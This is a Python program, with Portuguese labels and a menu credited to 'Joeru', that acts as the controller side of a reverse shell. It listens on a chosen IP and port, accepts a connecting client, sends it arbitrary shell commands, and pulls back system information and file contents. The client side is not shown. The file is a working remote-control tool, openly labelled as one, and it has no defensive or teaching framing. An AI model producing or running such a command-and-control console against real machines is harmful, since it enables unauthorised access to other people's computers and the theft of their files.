import os
import socket
from colorama import Fore, Back, Style, init
init()

os.system('title Servidor')

def criar_socket(ip_servidor,porta):
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[+]'+Style.RESET_ALL+' Socket Criado')
    criar_listener(serversocket, ip_servidor, porta)

def criar_listener(serversocket,ip_servidor,porta):
    serversocket.bind((ip_servidor, porta))
    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[+]'+Style.RESET_ALL+' IP e Porta Binded')
    serversocket.listen(3)
    print('\n'+Style.BRIGHT+Back.YELLOW+Fore.BLACK+'[...]'+Style.RESET_ALL+' A espera de um Cliente')
    clientsocket,address = serversocket.accept()
    cliente_address = str(address)
    print('\n'+Style.BRIGHT+Back.GREEN+Fore.WHITE+'[!]'+Style.RESET_ALL+' O Cliente:',cliente_address,'entrou no Servidor')
    comandos(clientsocket, address)

def servidor():
    ip_servidor = str(input(Style.BRIGHT+Fore.GREEN+'[->]'+Style.RESET_ALL+' IPv4 do Servidor: '))
    porta = int(input(Style.BRIGHT+Fore.GREEN+'[->]'+Style.RESET_ALL+' Porta: '))
    print('\n'+Style.BRIGHT+Back.YELLOW+Fore.BLACK+'[!]'+Style.RESET_ALL+' A Criar o Servidor')
    criar_socket(ip_servidor,porta)

def comandos(clientsocket, address):
    while True:
        comando = input("\n"+Style.BRIGHT+Fore.GREEN+"reverseshell"+Fore.YELLOW+"@"+Fore.RED+address[0]+Fore.MAGENTA+"> "+Style.RESET_ALL)

        if 'sair' in comando:
            clientsocket.send(str.encode(comando))
            clientsocket.close()
            os.system('cls')
            break
        elif 'limpar' in comando:
            clientsocket.send(str.encode(comando))
            os.system('cls')
        elif 'infocliente' in comando:
            clientsocket.send(str.encode(comando))
            rcv_data=str(clientsocket.recv(1024),'utf-8')
            print("Cliente",address)
            print(rcv_data)
        elif 'chdir' in comando:
            pasta=comando[3:]
            clientsocket.send(str.encode(comando))
        elif 'file' in comando:
            f_nome=comando[5:]
            clientsocket.send(str.encode(comando))
            f_data_rcv=str(clientsocket.recv(1024),'utf-8')
            f=open("teste.txt","w")
            f.write(f_data_rcv)
            f.close()
        else:
            clientsocket.send(str.encode(comando))
            msg_rcv = str(clientsocket.recv(1024), 'utf-8')
            print(msg_rcv)

def menu():
    os.system('cls')
    print(" ___________________________\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"-----ReverseShell-Menu-----"+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Back.GREEN+Fore.WHITE+"---------------------------"+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  1 - Criar Servidor       "+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  2 - Info                 "+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"  3 - Sair                 "+Style.RESET_ALL+"|\n|"+Style.BRIGHT+Fore.BLACK+Back.WHITE+"___________________________"+Style.RESET_ALL+"|\n")

def main():
    while True:
        menu()
        opcao = str(input('Selecione uma opcao> '))

        if '1' in opcao:
            os.system('cls')
            servidor()
        elif '2' in opcao:
            os.system('cls')
            print('Developer: Joeru\n')
            os.system('pause')
            os.system('cls')
        elif '3' in opcao:
            break

main()
